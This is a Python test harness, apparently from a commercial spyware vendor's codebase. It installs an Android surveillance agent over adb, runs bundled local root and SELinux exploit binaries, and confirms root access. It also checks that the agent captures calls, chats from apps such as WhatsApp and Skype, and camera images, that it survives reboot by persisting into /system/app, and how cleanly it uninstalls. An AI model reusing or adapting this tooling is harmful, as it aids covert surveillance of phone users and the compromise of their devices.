# -*- coding: utf-8 -*-

import sys, time
import csv
import os
import inspect
import traceback
import collections
import datetime
import adb
import argparse
import commands_device
from scripts.mobile.hardware.commands_device import CommandsDevice
from scripts.mobile.hardware.utils import wifiutils
from commands_rcs import CommandsRCS

import package

# apk_template = "build/android/install.%s.apk"
apk_template = "assets/autotest.%s.apk"
service = 'com.android.dvci'

def say(text):
    os.system("say " + text)


def check_exploit(dev, results):
    for f in ["expl_check", "local_exploit", "selinux_check", "selinux_exploit", "check.sh"]:
        adb.copy_tmp_file("assets/exploit/%s" % f, dev)
        adb.execute("chmod 755 /data/local/tmp/in/%s" % f, dev)
    check = adb.execute("/data/local/tmp/in/check.sh", dev)
    results["check_exploit"] = check.split()
    if "LOCAL" in check:
        ret_local = adb.execute("/data/local/tmp/in/local_exploit id", dev)
        print "Testing LOCAL: ", ret_local
        results["exploit_local"] = "root" in ret_local
    if "SELINUX" in check:
        ret_selinux = adb.execute("/data/local/tmp/in/selinux_exploit id", dev)
        print "Testing SELINUX: ", ret_selinux
        results["exploit_selinux"] = "root" in ret_selinux


def check_install(dev, results, factory=None):

    res = adb.execute("ls /sdcard/1 /sdcard/2 /system/bin/debuggered /system/bin/ddf /data/data/com.android.deviceinfo/ /data/data/com.android.dvci/ /sdcard/.lost.found /sdcard/.ext4_log /data/local/tmp/log /data/dalvik-cache/*StkDevice*  /data/dalvik-cache/*com.android.dvci* /data/app/com.android.dvci*.apk /system/app/StkDevice*.apk 2>/dev/null")
    res += adb.execute('pm path com.android.deviceinfo')
    res += adb.execute('pm path com.android.dvci')

    if res:
        adb.execute("ddf ru", dev)
        # uninstall device
        adb.uninstall(service, dev)

    res = adb.execute("ls /sdcard/1 /sdcard/2 /system/bin/debuggered /system/bin/ddf /data/data/com.android.deviceinfo/ /data/data/com.android.dvci/ /sdcard/.lost.found /sdcard/.ext4_log /data/local/tmp/log /data/dalvik-cache/*StkDevice*  /data/dalvik-cache/*com.android.dvci* /data/app/com.android.dvci*.apk /system/app/StkDevice*.apk 2>/dev/null")
    res += adb.execute('pm path com.android.deviceinfo')
    res += adb.execute('pm path com.android.dvci')

    if res:
        print "Error, still installed: " + res
        return False

    results["packages_remained"] = res

    if results['release'].startswith("2"):
        apk = apk_template % "v2"
    else:
        apk = apk_template % "default"
    # apk = apk_template % "default"

    # print "... building %s" % apk

    # if not os.path.isfile(apk):
    # if not commands.build_apk("silent", "castore", factory):
    # return False

    if not os.path.isfile(apk):
        print "not existent file: %s" % apk
        return False

    print "... installing %s" % apk
    # install
    if not adb.install(apk, dev):
        return False

    results["installed"] = True
    print "installation: OK"
    return True


def execute_agent(dev, results):
    processes = adb.ps(dev)
    running = service in processes
    if not running:
        if not adb.executeMonkey(service, dev):
            return False
        else:
            results["executed"] = True;
            print "executed: OK"

    # check for running
    time.sleep(3)
    processes = adb.ps(dev)
    running = service in processes

    if not running:
        if not adb.executeService(service, dev):
            return False
        else:
            results["executed"] = True;
            print "executed: OK"

    time.sleep(3)
    processes = adb.ps(dev)
    running = service in processes
    assert running

    say("agent installed, verify root request")
    return True

def check_su(dev, results):
    packages = adb.get_packages(dev)
    supack = ["supersu", "superuser"]
    if "com.noshufou.android.su" in packages:
        results["su"] = "noshufou"
    else:
        ret_su = adb.execute("su -v", dev)
        results["su"] = ret_su

    print "Has SU: ", results["su"]


def check_evidences(dev, c, results, timestamp=""):

    time.sleep(60)
    evidences, kinds = c.evidences()

    for k in ["call", "chat", "camera", "application"]:
         if k not in kinds.keys():
             kinds[k]= []

    ev = "\n"
    ok = kinds.keys()
    ok.sort()
    for k in ok:
        ev += "\t\t%s: %s\n" % (k, len(kinds[k]))
        if k in ["chat", "addressbook", "call"]:
            program = [e['data']['program'] for e in evidences if e['type'] == k]
            chat = set(program)
            for c in chat:
                ev += "\t\t\t%s\n" % (c)

    results['evidences' + timestamp] = ev
    results['evidence_types' + timestamp] = kinds.keys()

    results['uptime' + timestamp] = adb.execute("uptime", dev)

    expected = set()
    packages = adb.get_packages(dev)
    for i in ['skype', 'facebook', 'wechat', 'telegram', 'hangout', 'android.talk', 'line.android', 'viber',
              'tencent.mm', 'whatsapp']:
        for p in packages:
            if i in p:
                expected.add(i)

    results['expected'] = list(expected)


def uninstall_agent(dev, c, results):
    c.uninstall()

    #calc = [f.split(":")[1] for f in adb.execute("pm list packages calc", dev).split() if f.startswith("package:")][0]
    #packages = adb.get_packages(dev)
    #calc = [ p for p in packages if "calc" in p and not "localc" in p][0]
    #print "... executing calc: %s" % calc
    #adb.executeMonkey(calc, dev)
    #time.sleep(5)
    say("agent uninstall, verify request")

    for i in range(12):
        time.sleep(10)

        processes = adb.ps(dev)
        uninstall = service not in processes
        if uninstall:
            break

    results['uninstall'] = uninstall

    if not uninstall:
        print "uninstall: ERROR"
        print "processes: %s" % processes
        adb.uninstall(service, dev)
    else:
        print "uninstall: OK"


def check_uninstall(dev, results, reboot = True):
    if reboot:
        print ".... reboot"
        adb.reboot(dev)
        time.sleep(60)

    processes = adb.ps(dev)
    running = "still running: %s" % service in processes
    results['running'] = running

    res = adb.execute("ls /sdcard/1 /sdcard/2 /system/bin/debuggered /system/bin/ddf /data/data/com.android.deviceinfo/ /data/data/com.android.dvci/ /sdcard/.lost.found /sdcard/.ext4_log /data/local/tmp/log /data/dalvik-cache/*StkDevice*  /data/dalvik-cache/*com.android.dvci* /data/app/com.android.dvci*.apk /system/app/StkDevice*.apk 2>/dev/null")
    results["files_remained"] = res

    #res = adb.executeSU('cat /data/system/packages.list  | grep -i -e "dvci" -e "deviceinfo" -e "StkDevice"')
    #res += adb.executeSU('cat /data/system/packages.xml  | grep -i -e "dvci" -e "device" -e "StkDevice"')
    res = adb.execute('pm path com.android.deviceinfo')
    res += adb.execute('pm path com.android.dvci')

    results["packages_remained"] = res

def check_skype(dev, c, results):
    supported = ['4.0', '4.1', '4.2', '4.3']
    release = results['release'][0:3]

    results['call_supported'] = release in supported
    if release not in supported:
        print "Call not supported"
        return

    print "... waiting for call inject"
    info_evidences = []
    counter = 0
    while not info_evidences and counter < 10:
        info_evidences = c.infos('Call')

        counter += 1
        if not info_evidences:
            print "... waiting for info"
            time.sleep(10)
        else:
            break

    for i in range(10):
        time.sleep(10)
        ret = adb.executeSU("ls /data/data/com.android.dvci/files/l4", True, dev)
        print ret
        if "No such file" not in ret:
            print "Skype call and sleep"
            adb.skype_call(dev)
            time.sleep(90)
            ret = adb.executeSU("ls /data/data/com.android.dvci/files/l4", True, dev)
            print ret
            break


def check_camera(dev):
    adb.press_key_home(dev)
    adb.execute("am start -a android.media.action.IMAGE_CAPTURE", dev)
    time.sleep(10)


def set_time(dev):
    t = time.localtime()
    adb.execute('date -s %04d%02d%02d.%02d%02d%02d' % (t.tm_year, t.tm_mon, t.tm_mday, t.tm_hour, t.tm_min, t.tm_sec),
                dev)


def set_properties(dev, device_id, results):
    # getprop device
    props = adb.get_properties(dev)
    device = "%s %s" % (props["manufacturer"], props["model"])

    results['time'] = "%s" % datetime.datetime.now()
    results['device'] = device
    results['id'] = device_id
    results['release'] = props["release"]
    results['selinux'] = props["selinux"]
    results['build_date'] = props["build_date"]
    results['error'] = ""
    results["return"] = ""
    return results


def check_reboot(dev, results, delay = 60):
    print "... reboot"
    adb.reboot(dev)
    time.sleep(delay)

def check_persistence(c, dev, results, delay = 30):
    print "... reboot and check persistence"
    adb.press_key_home(dev)

    if not adb.check_remote_file("StkDevice.apk", "/system/app", timeout=30, device=dev):
        results["persistence"] = "No";

    adb.reboot(dev)
    time.sleep(delay)

    c.wait_for_start(2)

    adb.set_screen_on_and_unlocked(dev)

    ret = adb.execute("ls /system/app/StkDevice.apk")

    inst = adb.execute("pm path com.android.dvci")
    if "/data/app/" in inst:
        if "No such file" in ret:
            results["persistence"] = "No";
        else:
            results["persistence"] = "Reboot"
    elif "/system/app/" in inst:
        results["persistence"] = "Yes";
        print "... got persistence"
    else:
        results["persistence"] = "Error";

def test_device(id, dev, args, results):

    if args.fastnet:
        wifiutils.install_wifi_enabler(dev)
        commands_dev = CommandsDevice(dev_serialno=dev)
        commands_dev.wifi('open', check_connection=False)
        wifiutils.uninstall_wifi_enabler(dev)
        exit(0)

    if args.reboot:
        adb.reboot(dev)

    #tests = ["sync","persistence","root", "skype","camera"]
    #tests = ["persistence"]

    demo = True

    device_id = adb.get_deviceid(dev)

    commands_rcs = CommandsRCS(host = "192.168.100.100", login_id = id, device_id = device_id, operation = "Rite_Mobile", target_name = "HardwareFunctional", factory = 'RCS_0000002050')

    #build.connection.host = "rcs-zeus-master.hackingteam.local"
    #build.connection.operation = "Rite_Mobile"
    #target_name = "Functional"
    #factory = "RCS_0000000008"

    if args.build or not os.path.exists('assets/autotest.default.apk'):
        config = open('assets/config_mobile.json').read()
        config = config.replace("$(HOSTNAME)", commands_rcs.host)
        f = open("build/config.upload.json", "w")
        f.write(config)
        f.close()

        os.system('echo ruby assets/rcs-core.rb -u %s -p %s -d %s -f %s -c build/config.upload.json' % (commands_rcs.login, commands_rcs.password, commands_rcs.host, commands_rcs.factory))

        if demo:
            json = "build.demo.json"
        else:
            json = "build.nodemo.json"
        os.system(
            'ruby assets/rcs-core.rb -u %s -p %s -d %s -f %s -b %s -o and.zip' % (commands_rcs.login, commands_rcs.password, commands_rcs.host, commands_rcs.factory, json))
        os.system('unzip -o  and.zip -d assets')
        os.remove('and.zip')
    if not os.path.exists('assets/autotest.default.apk'):
        print "ERROR, cannot build apk"
        exit(0)

    set_time(dev)
    set_properties(dev, device_id, results)

    adb.set_screen_on_and_unlocked(dev)

    try:
        with commands_rcs as c:
            commands_rcs.delete_old_instance()

            # install agent and check it's running
            if not check_install(dev, results):
                return "installation failed"

            if not execute_agent(dev, results):
                return "execution failed"

            adb.press_key_home(dev)

            # sync e verifica
            c.wait_for_sync()

            # rename instance

            results['instance_name'] = c.rename_instance(results['device'])

            # check for root
            check_su(dev, results)

            result, root, info = c.check_root()
            results['root'] = root
            results['root_first'] = result
            check_evidences(dev, c, results, "_first")

            time.sleep(20)

            result, root, info = c.check_root()
            time.sleep(30)

            if result:
                # skype call
                check_skype(dev, c, results)

                # check camera
                check_camera(dev)

            # evidences
            check_evidences(dev, c, results, "_last")

        if args.interactive:
            say("press enter to uninstall %s" % id)
            ret = raw_input("... PRESS ENTER TO UNINSTALL\n")

        # uninstall
        uninstall_agent(dev, c, results)

        # check uninstall after reboot
        check_uninstall(dev, results)

    except Exception, ex:
        traceback.print_exc(device_id)
        results['error'] = "%s" % ex

    if args.fastnet:
        commands.uninstall('wifi_enabler', dev)


def report_if_exists(results, param):
    report = ""
    for p in param:
        report += "\t%s: %s\n" % (p, results.get(p, ""))
    return report


def report_test_rail(results):
    report = ""
    report += "Installation\n"
    report += report_if_exists(results,
                               ["time", "installed", "executed", "instance_name", "info", "uptime_first", "uptime_last",
                                "error",
                                "exception"])
    report += "Device\n"
    report += report_if_exists(results, ["device", "id", "release", "build_date"])
    report += "Root\n"
    report += report_if_exists(results, ["root", "root_first", "su", "selinux", "persistence"])
    report += "Evidences\n"
    report += report_if_exists(results, ["evidences_first", "evidences_last"])
    report += "Expected\n"
    report += report_if_exists(results, ["call_supported", "expected"])
    report += "Uninstall\n"
    report += report_if_exists(results, ["uninstall", "running", "files_remained", "packages_remained"])

    print report
    return report


def report_files(results, report):
    with open('report/test-%s.%s.txt' % (results.get('id', 0), results.get('device', "device")), 'ab') as tfile:
        tfile.write(report)

    with open('report/test-%s.%s.csv' % (results.get('id', 0), results.get('device', "device")), 'ab') as csvfile:
        # write header
        devicelist = csv.writer(csvfile, delimiter=";",
                                quotechar="|", quoting=csv.QUOTE_MINIMAL)
        devicelist.writerow(results.values())

    with open('report/hardware.logs.txt', 'a+') as logfile:
        logfile.write(str(results))
        logfile.write("\n")

    with open('report/hardware.logs.py', 'a+') as logfile:
        logfile.write("h.append(collections." + str(results) + ")")
        logfile.write("\n")


def parse_args():
    parser = argparse.ArgumentParser(description='AVMonitor master.')
    parser.add_argument('-b', '--build', required=False, action='store_true',
                        help="Rebuild apk")
    parser.add_argument('-i', '--interactive', required=False, action='store_true',
                        help="Interactive execution")
    parser.add_argument('-f', '--fastnet', required=False, action='store_true',
                        help="Install fastnet")
    parser.add_argument('-r', '--reboot', required=False, action='store_true',
                        help="Install fastnet")

    args = parser.parse_args()

    return args


def main():
    # from AVCommon import logger
    # logger.init()

    devices = adb.get_attached_devices()

    print """ prerequisiti:
    1) Telefono connesso in USB,
    2) USB Debugging enabled (settings/developer options/usb debugging)
    3) connesso wifi a RSSM
    4) screen time 10m (settings/display/sleep)
    """

    args = parse_args()


    print "devices connessi:"
    for id in range(len(devices)):
        print "%s) %s" % (id, devices[id][1])

    dev = None
    id = 0
    results = collections.OrderedDict()

    if not devices:
        print "non ci sono device connessi"
    else:
        if len(devices) > 1:
            id = raw_input("su quale device si vuole eseguire il test? ")
            dev = devices[int(id)][0]
            print "eseguo il test su %s" % dev

        try:
            test_device(id, dev, args, results)
        except Exception, ex:
            print ex
            traceback.print_exc()
            results['exception'] = ex

        print results
        report = report_test_rail(results)
        report_files(results, report)

    print "Fine."
    say("test ended %s" % id)
    print "Check manually with the evidences in the instance: %s" % (results.get('instance_name',"NO SYNC"))

if __name__ == "__main__":
    main()
